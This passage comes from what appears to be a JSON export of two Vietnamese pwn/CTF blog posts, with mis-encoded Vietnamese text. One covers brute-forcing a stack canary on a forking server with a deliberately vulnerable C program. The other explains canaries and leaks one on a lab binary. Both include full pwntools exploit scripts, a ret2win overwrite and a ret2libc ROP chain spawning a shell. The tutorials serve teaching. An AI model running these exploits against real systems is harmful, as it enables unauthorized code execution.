{\n        perror(\"socket failed\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Set socket options\n    int opt = 1;\n    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,\n                   &opt, sizeof(opt))) {\n        perror(\"setsockopt\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Bind socket to port\n    address.sin_family = AF_INET;\n    address.sin_addr.s_addr = INADDR_ANY;\n    address.sin_port = htons(PORT);\n\n    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {\n        perror(\"bind failed\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Listen for incoming connections\n    if (listen(server_fd, 3) < 0) {\n        perror(\"listen\");\n        exit(EXIT_FAILURE);\n    }\n\n    while (1) {\n        // Accept incoming connection\n        if ((new_socket = accept(server_fd, (struct sockaddr *)&address,\n                                 (socklen_t *)&addrlen)) < 0) {\n            perror(\"accept\");\n            exit(EXIT_FAILURE);\n        }\n\n        // Fork a new process to handle the connection\n        pid_t pid = fork();\n        if (pid < 0) {\n            perror(\"fork failed\");\n            exit(EXIT_FAILURE);\n        } else if (pid == 0) {\n            // Child process\n            close(server_fd);\n\n            // Call prog function and send output to client\n            client = new_socket ;\n            vuln(new_socket);\n            send(new_socket,\"NO OVERFLOW\\n\",strlen(\"NO OVERFLOW\\n\"),0);\n            close(new_socket);\n            exit(EXIT_SUCCESS);\n        } else {\n            // Parent process\n            close(new_socket);\n        }\n    }\n\n    return 0;\n}\n```\n</details>\n\nGi·∫£ s·ª≠ ƒë√¢y l√† ch∆∞∆°ng tr√¨nh ch·∫°y tr√™n server v√† ƒë∆∞·ª£c build b·∫±ng l·ªánh `gcc -o test test.c -no-pie`.\n\nƒê·ªçc code th√¨ ta th·∫•y h∆∞·ªõng ho·∫°t ƒë·ªông c·ªßa ch∆∞∆°ng tr√¨nh tr√™n nh∆∞ sau: ch∆∞∆°ng tr√¨nh t·∫°o socket cho client k·∫øt n·ªëi ·ªü `localhost 6969` (ch·∫°y local tr√™n m√°y) sau ƒë√≥ v·ªõi m·ªói client k·∫øt n·ªëi n√≥ s·∫Ω `fork()` ch√≠nh process n√†y cho client. Ngo√†i ra ta d·ªÖ d√†ng th·∫•y c√≥ l·ªói BOF ·ªü `vuln`\n\nTi·∫øp theo ta tham kh·∫£o h√†m `fork()`\n    \n![](https://i.imgur.com/60jZiEO.png)\n\nƒê√¢y l√† m·ªôt syscall tr√™n linux cho ph√©p ta dublicate process g·ªçi n√≥. Process con s·∫Ω ƒë∆∞·ª£c spawn ra c√≥ c√πng content v·ªõi parent. ƒêi·ªÅu n√†y ƒë·ªìng nghƒ©a v·ªõi gi√° tr·ªã stack canary c≈©ng kh√¥ng ƒë·ªïi\n\n![](https://i.imgur.com/GMiVnyc.png)\n\nDo ƒë√≥ ta c√≥ th·ªÉ l·ª£i d·ª•ng n√≥ ƒë·ªÉ bruteforce stack canary\n    \n## Bruteforce\nTa bi·∫øt ƒë∆∞·ª£c canary ·ªü x86-64 l√† m·ªôt s·ªë 8 byte m√† byte cu·ªëi lu√¥n t·∫≠n c√πng l√† `/x00`\n    \n![](https://i.imgur.com/6ujrdrt.png)\n\nDo ƒë√≥ s·∫Ω c√≥ √≠t nh·∫•t `255^7` t·ª©c `70110209207109375` gi√° tr·ªã t·ªìn t·∫°i. V√¨ v·∫≠y n·∫øu th·ª≠ t·ª´ng s·ªë th√¨ kh√¥ng bi·∫øt khi n√†o m·ªõi xong.\n\nCho n√™n ta s·∫Ω s√†i m·ªôt h∆∞·ªõng kh√°c, v√† h∆∞·ªõng n√†y ch√≠nh l√† bruteforces t·ª´ng byte. Khi ta th·ª≠ t·ª´ng byte nh∆∞ v·∫≠y, n·∫øu m·ªôt byte kh√¥ng tho·∫£ th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω exit v√† b√°o l·ªói, n·∫øu tho·∫£ th√¨ ch∆∞∆°ng tr√¨nh th·ª±c thi ti·∫øp v√† ta s·∫Ω l∆∞u l·∫°i byte ƒë√≥ ƒë·ªÉ bruteforce byte k·∫ø ti·∫øp.\n\n![](https://bananamafia.dev/img/binary-canary-bruteforce/canary_bruteforce.gif)\n    \nC√°ch n√†y t·ªëi ∆∞u h∆°n v√¨ 1 byte c√≥ 255 gi√° tr·ªã, v√† ta c√≥ 7 byte c·∫ßn bruteforce do ƒë√≥ s·∫Ω c√≥ nhi·ªÅu nh·∫•t : `255+255+255+255+255+255+255 (1785)` l·∫ßn th·ª≠, v√† n√≥ th·∫•p ƒë√°ng k·ªÉ so v·ªõi c√°ch kia\n    \n## Exploit\nTa ƒë√£ bi·∫øt h∆∞·ªõng khai th√°c v·∫≠y ta s·∫Ω vi·∫øt script\n\nƒê·∫ßu ti√™n ta gdb ƒë·ªÉ t√¨m offset. Do ta c·∫ßn debug child process sinh ra t·ª´ `fork()` n√™n ta c·∫ßn ƒë·ªÉ l·ªánh n√†y trong gdb\n\n![](https://i.imgur.com/D8B5Usw.png)\n\nTa nh·∫≠n th·∫•y ta c·∫ßn padding 10 byte r·ªìi t·ªõi stack canary, sau ƒë√≥ l√† padding th√™m 8 byte, cu·ªëi c√πng l√† return address \n\n![](https://i.imgur.com/PY2GOVB.png)\n\nTi·∫øp theo ta vi·∫øt script bruteforce b·∫±ng python nh∆∞ sau\n    \n```python\ndef brute_cana():\n        p = remote(\"localhost\",6969)\n        payload = 'A'*10\n        canary = \"\\x00\"\n        for step in range(0,7):\n                for i in range(0,256):\n                        leak = b\"\"\n                        try:\n                                sent = payload + canary + chr(i)\n                                p.sendafter(b'vuln read : ',sent)\n                                leak = p.recvline()\n                        except EOFError:\n                                p.close()\n                                p.clean()\n                                p = remote(\"localhost\",6969)\n\n                        if (len(leak) > 3) :\n                                canary += chr(i)\n                                break\n\n        print(\"[+] Canary =\",hex(u64(canary)))\n        return u64(canary)\n```\n\n·ªû ƒë√¢y ta t·∫°o m·ªôt h√†m t√™n `brute_cana`, sau ƒë√≥ ta k·∫øt n·ªëi v·ªõi host bruteforce t·ª´ng byte, n·∫øu b·ªã sai ·ªü byte n√†o th√¨ ta ti·∫øn h√†nh k·∫øt n·ªëi l·∫°i v√† th·ª±c hi·ªán ti·∫øp qu√° tr√¨nh tr√™n. ·ªû ƒë√¢y n·∫øu 1 byte bruteforce th√†nh c√¥ng th√¨ server s·∫Ω send `NO OVERFLOW` kh√¥ng th√¨ kh√¥ng c√≥ g√¨ n√™n ta l·ª£i d·ª•ng n√≥ ƒë·ªÉ bi·∫øt khi n√†o l√†m ti·∫øp byte ti·∫øp theo.\n\nTi·∫øp theo ta ch·∫°y th·ª≠ th√¨ ƒë∆∞·ª£c canary.\n\n![](https://i.imgur.com/f0gOgFa.png)\n\nV·∫≠y t·ªõi ƒë√¢y ta lo ƒë∆∞·ª£c canary, vi·ªác c√≤n l·∫°i l√† overwrite return address b·∫±ng ret2libc ƒë·ªÉ l·∫•y shell hay ·ªü ƒë√¢y m√¨nh ret2win ƒë·ªÉ minh ho·∫°.\n\nƒê·ªãa ch·ªâ h√†m `win`\n    \n![](https://i.imgur.com/tBUVMVF.png)\n\n·ªû ƒë√¢y ta th·∫•y c·∫ßn padding 8 byte r·ªìi m·ªõi t·ªõi ret address\n![](https://i.imgur.com/o9TcgVc.png)\n\nCu·ªëi c√πng vi·∫øt script:\n```python\ndef get_shell():\n        p = remote(\"localhost\",6969)\n        payload = b'a'*10 +p64(brute_cana())+ b'a'*8 + p64(0x40134e)\n\n        p.sendafter(b'vuln read : ',payload)\n        p.interactive()\n```\n\n- Full script:\n```python\nfrom pwn import *\n#exe = ELF(\"test\")\n\ndef brute_cana():\n        p = remote(\"localhost\",6969)\n        payload = 'A'*10\n        canary = \"\\x00\"\n        for step in range(0,7):\n                for i in range(0,256):\n                        leak = b\"\"\n                        try:\n                                sent = payload + canary + chr(i)\n                                p.sendafter(b'vuln read : ',sent)\n                                leak = p.recvline()\n                        except EOFError:\n                                p.close()\n                                p.clean()\n                                p = remote(\"localhost\",6969)\n\n                        if (len(leak) > 3) :\n                                canary += chr(i)\n                                break\n\n        print(\"[+] Canary =\",hex(u64(canary)))\n        return u64(canary)\n\ndef get_shell():\n        p = remote(\"localhost\",6969)\n        payload = b'a'*10 +p64(brute_cana())+ b'a'*8 + p64(0x40134e)\n\n        p.sendafter(b'vuln read : ',payload)\n        p.interactive()\n\nif __name__ ==  \"__main__\":\n        get_shell()\n```\n\nCh·∫°y th·ª≠ v√† ta overwrite th√†nh c√¥ng\n\n![](https://i.imgur.com/aoHxGyj.png)\n\n## References\n1. [Brute-Forcing x86 Stack Canaries](https://bananamafia.dev/post/binary-canary-bruteforce/)\n2. [Fork linux man page](https://man7.org/linux/man-pages/man2/fork.2.html)","tags":["linux"],"categories":["pwn","stack overflow"]},{"title":"Stack canary - M·ªôt c∆° ch·∫ø ngƒÉn ch·∫∑n Buffer Overflow","url":"/2023/04/07/stack-canary/","content":"# Stack canary - M·ªôt c∆° ch·∫ø ngƒÉn ch·∫∑n Buffer Overflow\nVi·ªác t·∫•n c√¥ng b·∫±ng c√°ch l·ª£i d·ª•ng buffer overflow ƒë·∫ßu ti√™n c√≥ th·ªÉ ƒë√£ xu·∫•t hi·ªán t·ª´ ƒë·∫ßu nh·ªØng nƒÉm 1980 v√† ƒë∆∞·ª£c bi·∫øt ƒë·∫øn nhi·ªÅu nh·∫•t do Robert Tappan Morris, ng∆∞·ªùi ƒë√£ t·∫°o ra m·ªôt lo·∫°i worm t·ª± nh√¢n b·∫£n b·∫±ng c√°ch khai th√°c l·ªó h·ªïng tr√™n trong ch∆∞∆°ng tr√¨nh sendmail ·ªü h·ªá th·ªëng c√°c m√°y Unix. Hi·ªán nay, ƒë√£ xu·∫•t hi·ªán nhi·ªÅu c∆° ch·∫ø ƒë·ªÉ ngƒÉn ch·∫∑n l·ªói buffer overflow tr√™n c√°c m√°y Unix, m·ªôt trong nh·ªØng c∆° ch·∫ø ƒë√≥ ch√≠nh l√† stack canary.\n\n![](https://i.imgur.com/eZOslMD.png)\nH√¨nh 1: Stack Canary ·ªü stack\n## Stack Canary l√† g√¨?\nV√†o nh·ªØng nƒÉm 1900 th√¨ vi·ªác ƒë√†o m·ªè l√† m·ªôt trong nh·ªØng c√¥ng vi·ªác nguy hi·ªÉm v√¨ l∆∞·ª£ng kh√≠ CO trong ƒë√¢y r·∫•t kh√≥ ph√°t hi·ªán b·ªüi n√≥ kh√¥ng m√πi. ƒê·ªÉ gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ ƒë√≥ th√¨ nh·ªØng ng∆∞·ªùi th·ª£ th∆∞·ªùng ƒëem theo m·ªôt lo·∫°i chim \"canary\" theo. Con chim n√†y c√≥ ng∆∞·ª°ng h·∫•p th·ª• kh√≠ CO √≠t h∆°n con ng∆∞·ªùi n√™n m·ªôt khi n√≥ g·∫∑p v·∫•n ƒë·ªÅ g√¨ tr∆∞·ªõc th√¨ ta c√≥ th·ªÉ ƒëi ra tr∆∞·ªõc m·ªôt c√°ch an to√†n.\n\n![](https://i.imgur.com/50GSpgY.png)\nH√¨nh 2: Chim canary\n\nV·ªõi c√πng m·ªôt ch·ª©c nƒÉng t∆∞∆°ng ƒë·ªìng nh∆∞ v·∫≠y, stack canary l√† m·ªôt c∆° ch·∫ø b·∫£o m·∫≠t ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·ªÉ ph√°t hi·ªán c√°c cu·ªôc t·∫•n c√¥ng b·∫±ng buffer overflow. N√≥ l√† m·ªôt gi√° tr·ªã b·∫•t k·ª≥ v√† lu√¥n t·∫≠n c√πng b·∫±ng byte 00,ƒë∆∞·ª£c l∆∞u tr·ªØ tr√™n ngƒÉn x·∫øp, ƒë∆∞·ª£c ƒë·∫∑t gi·ªØa `buffer` v√† `return address`, ho·∫°t ƒë·ªông nh∆∞ m·ªôt ng∆∞·ªùi b·∫£o v·ªá. Tr∆∞·ªõc khi m·ªôt h√†m return, n√≥ s·∫Ω ki·ªÉm tra ƒë·ªÉ ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã c·ªßa canary kh√¥ng thay ƒë·ªïi. N·∫øu gi√° tr·ªã canary ƒë√£ thay ƒë·ªïi, n√≥ ch·ªâ ra r·∫±ng ƒë√£ x·∫£y ra l·ªói buffer overflow v√† ch∆∞∆°ng tr√¨nh s·∫Ω k·∫øt th√∫c ngay l·∫≠p t·ª©c.\n\n![](https://i.imgur.com/Mht2XDg.png)\nH√¨nh 3: stack canary khi ph√°t hi·ªán c√≥ thay ƒë·ªïi do buffer overflow\n\n## C√°ch Stack Canary ho·∫°t ƒë·ªông\nKhi g·ªçi b·∫•t k·ª≥ m·ªôt h√†m n√†o th√¨ canary s·∫Ω ƒë∆∞·ª£c kh·ªüi t·∫°o ·ªü ƒë·∫ßu stack frame\n\n![](https://i.imgur.com/Jy2FNxb.png)\nH√¨nh 4: canary ƒë∆∞·ª£c kh·ªüi t·∫°o\n\nV√† khi return  s·∫Ω ƒë∆∞·ª£c check l·∫°i\n\n![](https://i.imgur.com/l3HfbnG.png)\nH√¨nh 5: check canary\n\nTrong qu√° tr√¨nh check ·ªü h√¨nh tr√™n, h√†m ƒë∆∞a `fs:0x28` t·ª©c canary g·ªëc v√†o register `rax` r·ªìi check v·ªõi canary ban ƒë·∫ßu ƒë∆∞·ª£c ƒë∆∞a v√†o stack ·ªü `[rbp-0x8]`. N·∫øu kh√°c s·∫Ω g·ªçi `__stack_chk_fail@plt` ƒë·ªÉ ƒë∆∞a v·ªÅ m√†n h√¨nh nh∆∞ *H√¨nh 3*\nCanary ƒë∆∞·ª£c m·∫∑c ƒë·ªãnh l√† b·∫≠t khi compile b·∫±ng gcc. ƒê·ªÉ disasble n√≥ ta c√≥ th·ªÉ th√™m argument `-fno-stack-protector` khi compile.\n\n## L·ª£i √≠ch\n\n∆Øu ƒëi·ªÉm l·ªõn nh·∫•t c·ªßa stack canary l√† n√≥ d·ªÖ c√†i ƒë·∫∑t (b·∫≠t m·∫∑c ƒë·ªãnh) v√† n√≥ add th√™m m·ªôt layer b·∫£o v·ªá cho ph·∫ßn m·ªÅm. Gi√° tr·ªã canary ƒë∆∞·ª£c t·∫°o ng·∫´u nhi√™n v√† thay ƒë·ªïi m·ªói khi ch∆∞∆°ng tr√¨nh ƒë∆∞·ª£c th·ª±c thi do ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng kh√≥ d·ª± ƒëo√°n n√≥. Ngo√†i ra, stack canary c≈©ng c√≥ th·ªÉ gi√∫p debug ch∆∞∆°ng tr√¨nh nhanh h∆°n. N·∫øu ta v√¥ t√¨nh thay ƒë·ªïi canary th√¨ n√≥ s·∫Ω tho√°t ngay l·∫∑p t·ª©c gi√∫p ta d·ªÖ d√†ng nh·∫≠n di·ªán l·ªói. \n\n## T·∫•n c√¥ng\nHi·ªán nay c√≥ 2 c√°ch ph·ªï bi·∫øn nh·∫•t ƒë·ªÉ t·∫•n c√¥ng ch∆∞∆°ng tr√¨nh c√≥ stack canary: Brute force v√† Leak \n### Brute forces\nƒê·ªëi v·ªõi ch∆∞∆°ng tr√¨nh 32-bit th√¨ canary c√≥ th·ªÉ nh·∫≠n gi√° tr·ªã t·ª´ 0 -> 2^32-1 (h∆°n 4 t·ª∑ ch√∫t) v√† s·ªë n√†y c√≤n l·ªõn h∆°n ƒë·ªëi v·ªõi c√°c ch∆∞∆°ng tr√¨nh 64-bit. Vi·ªác khai th√°c b·∫±ng brute force theo l√Ω thuy·∫øt l√† ƒë∆∞·ª£c nh∆∞ng th·ª±c t·∫ø v√†o c√°c b√†i CTF th√¨ ch·∫Øc ch·∫Øn kh√¥ng th·ªÉ.\n### Leak\nƒê√¢y l√† c√°ch ph·ªï bi·∫øn nh·∫•t v√† t·ªëi ∆∞u nh·∫•t. ·ªû ƒë√¢y m√¨nh s·∫Ω demo qua chall [bof4chall2](https://drive.google.com/file/d/1dQNtPmXNP2wsTL_3H2_jRfEALedMpCOW/view) c·ªßa anh Qu√≠\n- B√†i cho ta 1 file binary\n- ƒê·∫ßu ti√™n ta checksec. Nh·∫≠n th·∫•y canary b·∫≠t v√† No PIE\n    \n![](https://i.imgur.com/SpgymX1.png)\n\n- Ti·∫øp theo v√†o IDA ƒë·ªÉ xem th·ª≠. Nh·∫≠n th·∫•y c√≥ l·ªói buffer overflow ·ªü h√†m vuln. C√°c bi·∫øn b·ªã overflow g·ªìm : `buf`,`v3`\n\n![](https://i.imgur.com/qXDhSjI.png)\n\n- H√†m `puts` s·∫Ω in ƒë·∫øn khi n√†o g·∫∑p null byte v√† tr∆∞·ªõc ƒë√≥ c√≥ bi·∫øn `buffer` b·ªã overflow n√™n ta s·∫Ω l·ª£i d·ª•ng n√≥ ƒë·ªÉ leak canary\n- V√†o GDB t√¨m offset. Ta th·∫•y ta c·∫ßn t√¨m ch·ªçn padding l√† `0x007fffffffdf88-0x007fffffffdf78 +1` t·ª©c 17 byte (c·ªông 1 v√¨ ƒë·ªÉ xo√° byte 00 - n·∫øu kh√¥ng th√¨ puts s·∫Ω d·ª´ng tr∆∞·ªõc ƒë√≥)\n\n![](https://i.imgur.com/AyJESSI.png)\n\n- Vi·∫øt script ƒë·ªÉ check : \n\n```python\np.sendlineafter(b'name ?\\n',b'a'*17)\np.recvuntil(b'\\x0a')\nleak = u64(b'\\x00'+ p.recvn(7))\nprint('canary : ',hex(leak))\n```\n\n- Ch·∫°y th·ª≠ th√¨ ta leak ƒë√∫ng canary \n\n![](https://i.imgur.com/UNQEb3C.png)\n\n- Sau khi leak canary xong th√¨ b√†i n√†y ch·ªâ l√† m·ªôt b√†i ret2libc c∆° b·∫£n. ·ªû ƒë√¢y m√¨nh s·∫Ω t√¨m gadget pop_rdi ret ƒë·ªÉ ROP chain kh√¥ng s√†i one_gadget.\n- Full script: \n```python\nfrom pwn import *\nexe = ELF(\"bof4chall2\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\np = process(exe.path)\np.sendlineafter(b'name ?\\n',b'a'*17)\np.recvuntil(b'\\x0a')\nleak = u64(b'\\x00'+ p.recvn(7))\nprint('canary : ',hex(leak))\npop_rdi_ret = 0x00000000004013b3\npayload = b'a'*8 + p64(leak) + b'a'*40+ p64(pop_rdi_ret) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])\n\np.sendlineafter(b'rop ?\\n',payload)\np.recvuntil(b'enabled?\\n')\nlibc_leak = u64(p.recvline()[:-1] + b'\\x00\\x00')\nlibc.address = libc_leak - 528080\n\np.sendlineafter(b'name ?\\n',b'a')\npayload = b'a'*8 + p64(leak) + b'a'*40+ p64(pop_rdi_ret)+p64(next(libc.search(b'/bin/sh')))+p64(0x000000000040101a)+ p64(libc.sym['system'])\np.sendlineafter(b'rop ?\\n',payload)\np.interactive()\n```\n- Ch·∫°y script tr√™n ta s·∫Ω c√≥ shell\n\n![](https://i.imgur.com/H34E0CO.png)\n\n## T√†i li·ªáu tham kh·∫£o\n1. [Stack Canary YT](https://www.youtube.com/watch?v=N7kGd76evsM&ab_channel=AaronYoo)\n2. [CTF101](https://ctf101.org/binary-exploitation/stack-canaries/)\n3. [Wiki](https://en.wikipedia.org/wiki/Buffer_overflow#:~:text=The%20earliest%20documented%20hostile%20exploitation,service%20on%20Unix%20called%20finger.)","tags":["linux"],"categories":["pwn","stack overflow"]}]